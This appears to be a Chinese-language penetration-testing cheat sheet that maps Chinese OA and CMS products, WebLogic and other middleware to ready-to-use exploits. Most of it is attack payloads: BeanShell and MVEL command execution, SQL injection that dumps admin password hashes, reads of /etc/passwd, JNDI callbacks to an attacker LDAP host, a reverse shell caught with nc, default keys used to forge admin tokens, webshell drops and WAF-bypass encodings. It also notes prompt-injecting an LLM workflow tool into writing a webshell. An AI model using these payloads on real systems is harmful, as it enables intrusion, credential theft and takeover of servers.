# 国产产品与中间件攻击面（OA/CMS/中间件速查）

> 何时用: 指纹识别出国产 OA/CMS 或 Java 中间件后，按产品取对应漏洞利用路径。POC 均为公开漏洞，版本敏感用前实测。

## 1. 泛微 OA

| 漏洞 | 类型 | 路径 |
|---|---|---|
| CNVD-2019-32204 | BeanShell RCE | /weaver/bsh.servlet.BshServlet |
| - | SQL 注入 | /js/hrm/getdata.jsp |
| - | 任意文件上传 | /weaver/weaver.common.Ctrl/.css |
| - | 信息泄露 | /mobile/DBconfigReader.jsp |
| - | 云桥文件读取 | /wxjsapi/saveYZJFile |

```
# BeanShell RCE（绕过: Unicode 编码/空字节拼接 eval%00("ex"%2b"ec(...)")）
POST /weaver/bsh.servlet.BshServlet
bsh.script=exec("cmd /c dir");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw

# SQL 注入直读管理员哈希
GET /js/hrm/getdata.jsp?cmd=getSelectAllid&sql=select%20password%20as%20id%20from%20HrmResourceManager

# 上传（ZIP 内文件名 ../../../shell.jsp 穿越落盘）
POST /weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp

# 信息泄露 → DES 固定密钥 1z2x3c4v5b6n 直接解密数据库配置
GET /mobile/DBconfigReader.jsp

# 云桥任意文件读取
/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt
```

## 2. WebLogic

| CVE | 类型 | 路径 |
|---|---|---|
| CVE-2017-10271 | XMLDecoder RCE | /wls-wsat/CoordinatorPortType |
| CVE-2019-2725 | 反序列化 RCE | /_async/AsyncResponseService |
| CVE-2014-4210 | SSRF | /uddiexplorer/SearchPublicRegistries.jsp |
| CVE-2020-14882 | 未授权 RCE | /console/images/%252E%252E%252Fconsole.portal |
| CVE-2020-2555 | 反序列化 RCE | T3 协议 |
| CVE-2021-2109 | LDAP RCE | /console/css/%252e%252e/consolejndi.portal |

```
# CVE-2020-14882: 双重编码穿越 + MVEL
POST /console/images/%252E%252E%252Fconsole.portal
_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('id');");

# CVE-2021-2109: JNDI（LDAP 分号代冒号绕解析）
/console/css/%252e%252e/consolejndi.portal?...JndiBindingHandle(%22ldap://attacker;1389/Basic/WeblogicEcho;AdminServer%22)
```
WAF 面: T3 二进制难检｜双重编码｜ldap 分号变体。JNDI 接 jndi-injection.md，反序列化接 deserialization.md。

## 3. 产品→漏洞类型总映射（指纹后按图索骥）

| 域 | 产品 | 主要漏洞类型 |
|---|---|---|
| 国产 CMS | 74CMS/CatfishCMS/CmsEasy/DedeCMS/Discuz/EmpireCMS/FineCMS/PbootCMS/YzmCMS/Zzcms | SQL 注入/Getshell/RCE/SSTI/文件读取 |
| 国外 CMS | WordPress（`wpscan --url http://T --enumerate vp,vt,u` 枚举插件/主题/用户）/Drupal（`searchsploit drupal` → **34992.py 加管理员** `python2 34992.py -t URL -u user -p pass`——注册关闭时的标准入口; RCE 用 msf `drupal_drupalgeddon2`，非标端口记得 set rport）/Joomla | RCE/SQL/多类 |
| OA | 泛微/致远（A8 htmlofficeservlet getshell）/通达（任意用户登录）/用友（NC XbrlPersistenceServlet 反序列化、U8 test.jsp SQL）/金蝶/蓝凌/禅道/帆软 | 上传/RCE/SQL/登录绕过 |
| Web 服务器 | Apache（多后缀解析/CVE-2017-15715/CVE-2021-41773+42013 路径穿越: `curl --path-as-is .../cgi-bin/.%2e/.%2e/etc/passwd`，仅 2.4.49-2.4.50，RCE 需 CGI 启用）/Tomcat（CVE-2017-12617 PUT/CVE-2019-0230）/Struts2（s2-045/057）/Nginx（CRLF/目录遍历）/IIS（解析/短文件名） | 解析/上传/RCE |
| 中间件 | WebLogic（§2）/JBoss（CVE-2010-0738 未授权/CVE-2015-7501/CVE-2017-7504 反序列化）/Fastjson（1.2.22-24 反序列化、=1.2.47 RCE，payload 见 deserialization.md §2）/WebSphere/Alibaba Nacos（未授权/权限绕过; **默认 JWT SecretKey** "ThisIsMyCustomSecretKey0024..." 伪造 token 直接调 /nacos/v1/auth/users 加管理员）/Harbor（CVE-2019-16097）/ActiveMQ（**CVE-2015-5254** 反序列化: 外网伺服 python3 -m http.server 挂 poc.xml + `exploit.py -i target -p port -u http://外网:9999/poc.xml` → nc 收反弹; Struts2 CVE-2017-5638 有现成检测工具一把梭）/GeoServer（**CVE-2024-36401** OGC Filter evaluate 属性名 RCE 9.8，POST /geoserver/ows）/FlowiseAI（WriteFileTool 任意写——LLM 流程注入诱导写 webshell） | 反序列化/RCE/未授权 |
| 国产框架 | ThinkPHP 5.x（invokefunction RCE: `?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`）/ThinkPHP 反序列化 POP 链（phpggc） | RCE/反序列化 |
| 数据库 | MySQL（LOAD DATA LOCAL 读客户端文件）/Redis/MongoDB/PostgreSQL（COPY）/MSSQL（xp_cmdshell） | 未授权/RCE/文件读 |
| Web 应用 | FCKeditor/UEditor/KindEditor（编辑器上传）/Adminer/phpMyAdmin/Confluence/Jenkins/GitLab/Citrix/Exchange | 上传/文件读/RCE |
| PHPMailer | **CVE-2016-10033**（<5.2.18）: email 字段注入 sendmail extra_params `-X/var/www/html/d.php` 邮件全文落 webshell; 同族 CVE-2016-10045 空格变体 | RCE |

自动化流程: 指纹（whatweb/wappalyzer/httpx -tech-detect）→ 按表选漏洞类型 → nuclei `-tags 产品名` 或对应 POC → 有 WAF 先过 waf-bypass.md。
